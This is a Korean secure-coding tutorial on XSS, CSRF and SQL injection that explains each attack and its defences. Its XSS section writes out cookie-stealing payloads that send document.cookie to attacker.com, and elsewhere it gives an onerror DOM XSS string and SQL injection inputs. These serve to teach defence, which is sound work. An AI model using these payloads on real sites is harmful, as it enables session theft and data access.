...
> XSS·CSRF·SQL Injection을 서로 다른 기술 결함으로만 보기 쉽습니다. 이 문서는 세 공격이 각각 무엇을 착각한 결과인지 코드 수준에서 짚고, 취약한 코드를 안전한 코드로 고치는 근거를 설명합니다.
...
웹 취약점 목록은 길지만, 상위 항목 대부분은 한 문장으로 압축됩니다.

> **개발자는 "데이터"로 넣었는데, 해석하는 쪽은 "코드"로 읽었습니다.**

주소록에 `홍길동`이라고 적으면 이름입니다. 그런데 어떤 시스템은 `홍길동, 삭제:전체`라고 적으면 뒤쪽을 명령으로 읽어버립니다. 데이터를 적는 칸과 명령을 적는 칸이 같은 문자열로 합쳐져 있기 때문입니다.

> **비유의 한계**: 실제로는 "칸"이 물리적으로 나뉘어 있지 않습니다. 문자열 하나를 파서가 훑으면서 문법과 값을 구분하므로, 어디까지가 값인지는 전적으로 파서의 규칙에 달려 있습니다.
...
앞의 셋은 **파서에게 "여기부터는 값이다"라고 알려주면** 사라집니다. CSRF만 성격이 다릅니다. 문제는 "요청이 정상적으로 만들어졌는가"가 아니라 "**누가 이 요청을 시켰는가**"를 서버가 모른다는 데 있습니다.

---

## 2. XSS (Cross-Site Scripting)

공격자가 심은 스크립트가 **피해자의 브라우저에서, 그 사이트의 권한으로** 실행됩니다. 같은 출처에서 실행되므로 `document.cookie`, `localStorage`, 화면에 그려진 모든 데이터, 그리고 그 사용자로서 보내는 모든 요청이 공격자 손에 들어갑니다.
...
**왜 문제인가**: 저장된 값이 `<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">`라면, 이 게시글을 여는 **모든 사용자**의 세션 쿠키가 공격자에게 전송됩니다.
...
**왜 문제인가**: 공격자가 아래 링크를 피싱 메일이나 단축 URL로 뿌리면, 클릭한 사람의 브라우저에서 스크립트가 실행됩니다. 저장형과 달리 DB에 흔적이 남지 않습니다. 그래서 공격받은 사실 자체를 모르고 지나가기 쉽습니다. `https://shop.example.com/search?q=<script>location='https://attacker.com/?c='%2Bdocument.cookie</script>`

개선은 두 갈래입니다. 서버 렌더링이면 값을 model에 담고 `th:text`로 출력해서, 템플릿 엔진의 자동 이스케이프에 맡깁니다. HTML을 문자열로 조립해야만 한다면 인코딩을 명시합니다 — `"<h1>" + HtmlUtils.htmlEscape(q) + "</h1>"` (`org.springframework.web.util`).

### 유형 3. DOM-based XSS — 서버는 아무 잘못이 없다

서버가 내려준 HTML은 멀쩡한데 **클라이언트 자바스크립트가** URL 조각을 DOM에 꽂으면서 터집니다. `#` 뒤 fragment는 서버로 전송조차 되지 않으므로 서버 로그에 흔적이 남지 않습니다.
...
**왜 문제인가**: `https://app.example.com/#<img src=x onerror=alert(document.cookie)>`로 접속하면 `innerHTML`이 그 문자열을 HTML로 파싱합니다. `<script>` 태그는 `innerHTML`로 넣어도 실행되지 않습니다. 하지만 `onerror`·`onload` 같은 이벤트 핸들러 속성은 그대로 동작합니다. **"script 태그만 막으면 된다"는 블랙리스트 발상이 무너지는 지점**이 여기입니다.
...
`innerHTML`, `outerHTML`, `document.write`, `eval`, `location.href` 대입이 DOM XSS의 대표 진입점입니다.

### 프레임워크를 쓰면 안전한가 — 절반만

React·Vue는 기본적으로 값을 이스케이프하지만 우회로가 두 군데 있습니다.
...
XSS 방어에서 가장 많이 놓치는 지점입니다. HTML 이스케이프 하나로 모든 자리를 막을 수 없습니다.
...
> 결론: **HTML 안에 자바스크립트나 URL을 문자열로 조립하지 않는 것**이 가장 안전합니다. 서버 데이터는 `<script type="application/json">`에 담아 `JSON.parse`로 읽되, 값 안의 `</script>`는 따로 이스케이프해야 합니다. 그 문자열이 나오는 순간 HTML 파서가 스크립트 블록을 거기서 끝내버립니다.

### 2차 방어 — CSP와 HttpOnly

출력 인코딩이 1차 방어이고 아래는 "그래도 한 군데를 놓쳤을 때" 피해를 줄이는 층입니다.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-a1b2c3'; object-src 'none'
```

`script-src 'self'`는 같은 출처에서 내려온 스크립트만 허용합니다. 인라인 스크립트(`<script>...</script>`, `onerror=`)는 기본으로 차단되니, 위에서 본 `onerror` 공격이 실행 단계에서 막힙니다. 반면 `'unsafe-inline'`을 넣으면 그 차단이 통째로 해제되어 **CSP를 켰다는 안도감만 남습니다.** 기존 인라인 코드 때문에 어쩔 수 없다면 요청마다 랜덤 값을 심는 **nonce** 방식을 씁니다. 공격자가 삽입한 태그에는 nonce가 없습니다.

쿠키에 `HttpOnly`를 걸면 `document.cookie` 접근이 막히지만 **XSS 자체를 막는 것은 아닙니다.** 스크립트는 여전히 실행됩니다. 쿠키를 훔치는 대신 그 사용자로서 요청을 보내면 그만입니다.
...
공격자는 **응답을 읽지 못합니다**(Same-Origin Policy가 막습니다). 읽을 필요도 없습니다. 요청이 처리되기만 하면 목적은 달성됩니다. 그래서 "CORS가 막아주지 않나요?"는 오해입니다. CORS는 응답 읽기를 막을 뿐 요청 전송은 막지 않습니다.
...
`Lax`만으로도 위 시나리오의 대부분이 차단됩니다. 다만 **GET으로 상태를 바꾸는 API가 있으면 링크 클릭 유도로 뚫립니다.** 최상위 내비게이션 GET에는 쿠키가 붙기 때문입니다. 그래서 **GET은 상태를 변경하지 않는다**는 REST 원칙이 그 자체로 CSRF 방어입니다.
...
**왜 문제인가**: 이 코드가 확인하는 것은 "요청을 보낸 브라우저에 유효한 세션이 있는가"뿐입니다. "사용자가 우리 화면에서 의도적으로 눌렀는가"는 다른 질문이고, 이 코드는 그것을 확인하지 않습니다.

Spring Security는 CSRF 필터가 기본으로 켜져 있어서, 세션에 저장한 토큰과 요청의 `_csrf` 값을 비교하고 다르면 403으로 거부합니다. Thymeleaf는 `th:action`을 쓰면 hidden 토큰을 자동으로 넣어 주고, SPA에서는 `X-CSRF-TOKEN` 헤더에 실어 보냅니다. 공격자가 이 토큰을 알아내려면 우리 페이지의 응답을 읽어야 합니다. 그런데 SOP가 그것을 막습니다. **SOP가 있어야 CSRF 토큰이 의미를 갖습니다.**
...
`Origin`은 브라우저가 붙이며 자바스크립트로 위조할 수 없습니다. 다만 일부 상황에서는 헤더 자체가 없어서
**없을 때 어떻게 처리할지**를 정해야 합니다. 무조건 거부하면 정상 요청이 깨지고 허용하면 방어가 무력해지므로, 주 방어가 아니라 보조 층으로 씁니다.

### 토큰 기반 인증이면 CSRF가 없나

`Authorization: Bearer <token>`은 **브라우저가 자동으로 붙여주지 않습니다.** 조건 1이 성립하지 않아 CSRF도 성립하지 않습니다. 대신 그 토큰을 `localStorage`에 두면 XSS 한 번에 전부 털립니다.
...
> 결론: Access Token은 메모리, Refresh Token은 `HttpOnly; Secure; SameSite` 쿠키에 두고 갱신 엔드포인트에서만 쓰는 구성이 무난합니다. **CSRF를 피하려다 XSS 노출을 키우는 맞바꿈**을 경계합니다.
...
**왜 문제인가**: 이스케이프 규칙은 **DB 제품, 문자 인코딩, 설정에 따라 달라집니다.** MySQL은 백슬래시를 이스케이프 문자로 취급하지만 표준 SQL은 아닙니다. 무엇보다
**숫자 컬럼에는 따옴표가 없어서** `WHERE id = " + id`에 `1 OR 1=1`을 넣으면 치환이 아무 소용이 없습니다. "내가 모든 경우를 다 막았는가"를 개발자가 매번 증명해야 하는 방어는 결국 뚫립니다.
...
핵심은 **문자열을 안전하게 만드는 것이 아니라, 문자열을 아예 합치지 않는 것**입니다.
...
DB는 `?` 자리표시자가 있는 상태로 먼저 구문을 분석하고 실행 계획을 세웁니다. 파싱이 끝난 트리는 값으로 바꿀 수 없으므로 `' OR '1'='1`이 들어와도 "**따옴표가 포함된 이메일 문자열**"이 될 뿐입니다. JDBC 드라이버에 따라 이 분리를 클라이언트 쪽에서 처리하기도 하지만, 성질은 동일합니다.

### PreparedStatement로도 못 막는 자리

바인딩할 수 있는 것은 **값**뿐입니다. 테이블명, 컬럼명, `ORDER BY` 방향은 파스 트리의 **구조**라서 `?`를 쓸 수 없습니다.
...
ORM도 만능이 아닙니다. JPA는 내부적으로 PreparedStatement를 쓰지만, JPQL이나 네이티브 쿼리를 문자열로 조립하면 취약점이 그대로 살아납니다(`@Query("... LIKE %:name%")`처럼 이름 있는 파라미터를 씁니다). MyBatis에서는 `${}`가 문자열 치환이고 `#{}`가 파라미터 바인딩입니다. 그래서 **`${}`는 인젝션에 그대로 노출됩니다.**
...
**A01이 1위라는 점**을 눈여겨볼 만합니다. 프레임워크가 인젝션은 상당 부분 막아 주지만, "이 사용자가 이 리소스를 볼 수 있는가"는 대신 판단해 줄 수 없습니다. 목록은 몇 년 주기로 갱신되니 최신판도 확인해 둡니다.
...
- **Spring Security의 CSRF 필터를 끄는 것이 관행처럼 굳어 있습니다.** 세션을 안 쓰는 REST API라면 타당하지만, 세션 쿠키를 그대로 쓰면서 `csrf().disable()`만 넣은 코드가 흔합니다. 쿠키 인증이면 끄면 안 됩니다.
- **CSP는 `Content-Security-Policy-Report-Only`로 먼저 배포합니다.** 위반 사항만 리포트로 받고 차단은 하지 않는 모드입니다. 기존 인라인 스크립트 규모를 파악한 뒤 단계적으로 조입니다.
- **의존성 취약점(A06)은 자동화로 관리합니다.** Dependabot, `npm audit`, OWASP Dependency-Check를 CI에 붙여두면 새 CVE가 공개될 때 알림이 옵니다.
- **운영 응답에 스택 트레이스를 내보내지 않습니다.** 프레임워크 버전과 내부 경로가 노출되면 공격자에게 지도를 주는 셈입니다. 일반화된 메시지와 추적 ID만 반환합니다.
...
A. 악성 스크립트가 어디에 머물다 실행되느냐로 나눕니다. Stored는 DB에 저장돼 그 화면을 보는 모든 사용자에게 실행되므로 피해가 가장 큽니다. Reflected는 URL 파라미터가 응답에 되비쳐 링크를 클릭한 사람에게만 실행됩니다. DOM-based는 서버를 거치지 않고 클라이언트 JS가 `location.hash` 같은 값을 `innerHTML`에 넣을 때 발생해, 서버 로그에 흔적이 없어 탐지가 가장 어렵습니다. 공통 방어는 출력 시점의 컨텍스트별 인코딩이고 CSP와 HttpOnly는 2차 층입니다.
- 꼬리 질문: "`<script>` 태그만 필터링하면 되지 않나요?" → `innerHTML`로 삽입된 `<script>`는 오히려 실행되지 않고, 실제 공격은 `<img onerror>`, `<svg onload>`, `javascript:` URL로 들어옵니다. 블랙리스트는 항상 우회당하므로 출력 인코딩이 정답입니다.

**Q. CSRF는 어떤 조건에서 성립하나요?**

A. 세 가지가 동시에 필요합니다. 브라우저가 자격 증명을 자동으로 붙이고, 서버는 요청 출처를 검증하지 않으며, 공격자는 요청을 완전히 재현할 수 있어야 합니다. 그래서 방어도 각 조건을 깨는 방향입니다. SameSite 쿠키가 첫째를, Origin 검증이 둘째를, CSRF 토큰이 셋째를 깹니다. Bearer 토큰은 브라우저가 자동으로 붙이지 않으므로 첫째 조건 자체가 성립하지 않습니다.
- 꼬리 질문: "CORS가 CSRF를 막아주지 않나요?" → 막지 못합니다. CORS는 응답을 JS에 노출할지 결정할 뿐 요청 전송은 막지 않고, CSRF 공격자는 애초에 응답을 읽을 필요가 없습니다.
...
A. XSS입니다. CSRF는 공격자가 정해둔 요청 하나를 보내게 만드는 데 그치고 응답도 읽지 못하지만, XSS는 피해자 브라우저에서 임의 코드를 실행하므로 CSRF 토큰까지 읽어낼 수 있습니다.
**XSS가 뚫리면 CSRF 방어도 함께 무력화**되므로 방어 우선순위는 XSS가 먼저입니다.
- 꼬리 질문: "XSS가 있으면 HttpOnly도 소용없나요?" → 쿠키 값 탈취는 막지만, 스크립트가 그 브라우저 안에서 사용자 대신 요청을 보내는 것은 막지 못합니다. 피해 축소책이지 차단책이 아닙니다.
...
| "React를 쓰니 XSS는 신경 안 써도 된다" | `dangerouslySetInnerHTML`과 `href`/`src`는 자동 이스케이프 밖이다 | 프레임워크는 HTML 텍스트 자리만 막아줍니다. URL 스킴은 직접 검증 |
| "HttpOnly를 걸었으니 XSS는 안전하다" | 쿠키 탈취만 막을 뿐 스크립트 실행은 그대로다 | 공격자는 쿠키 없이도 그 브라우저에서 요청을 보낼 수 있다 |
| "CORS를 설정했으니 CSRF도 막힌다" | CORS는 응답 읽기만 통제한다 | CSRF는 응답을 읽지 않아도 성립합니다. SameSite/토큰이 필요 |
...
XSS와 SQL Injection은 **데이터를 코드로 해석하게 둔 실수**이므로, 파서에게 경계를 알려주는 것(인코딩, 파라미터 바인딩)으로 풉니다. CSRF는 **요청의 출처를 묻지 않은 실수**이므로 자동 첨부·출처 미검증·재현 가능성 중 하나를 깨서 풉니다.
